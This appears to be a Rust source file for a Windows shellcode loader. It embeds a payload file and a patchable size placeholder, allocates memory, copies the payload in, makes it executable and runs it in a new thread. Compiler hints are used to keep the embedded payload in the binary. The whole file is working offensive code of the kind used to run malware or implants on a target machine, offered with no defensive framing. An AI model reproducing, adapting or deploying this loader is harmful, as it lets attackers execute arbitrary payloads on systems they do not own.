use std::mem::transmute;
use std::ptr::{copy, null, null_mut};
use std::hint::black_box;
use windows_sys::Win32::Foundation::{GetLastError, FALSE, WAIT_FAILED};
use windows_sys::Win32::System::Memory::{
    VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE, PAGE_READWRITE,
};
use windows_sys::Win32::System::Threading::{CreateThread, WaitForSingleObject};

// Force the size holder to be embedded in the binary by preventing optimization
#[inline(never)]
fn get_size_holder() -> &'static str {
    // Use a valid numeric string that can be parsed
    black_box("999999")
}

// Force the shellcode data to be preserved
#[inline(never)]
fn get_shellcode() -> &'static [u8] {
    black_box(include_bytes!("../shellcode"))
}

#[cfg(target_os = "windows")]
fn main() {
    let shellcode = get_shellcode();
    let size_holder_str = get_size_holder();
    let shellcode_len = usize::from_str_radix(size_holder_str, 10).unwrap();
    let shellcode = &shellcode[0..shellcode_len];
    let shellcode_size = shellcode.len();

    unsafe {
        let addr = VirtualAlloc(
            null(),
            shellcode_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if addr.is_null() {
            panic!("[-]VirtualAlloc failed: {}!", GetLastError());
        }

        copy(shellcode.as_ptr(), addr.cast(), shellcode_size);

        let mut old = PAGE_READWRITE;
        let res = VirtualProtect(addr, shellcode_size, PAGE_EXECUTE, &mut old);
        if res == FALSE {
            panic!("[-]VirtualProtect failed: {}!", GetLastError());
        }

        let addr = transmute(addr);
        let thread = CreateThread(null(), 0, addr, null(), 0, null_mut());
        if thread == 0 {
            panic!("[-]CreateThread failed: {}!", GetLastError());
        }

        WaitForSingleObject(thread, WAIT_FAILED);
    }
}
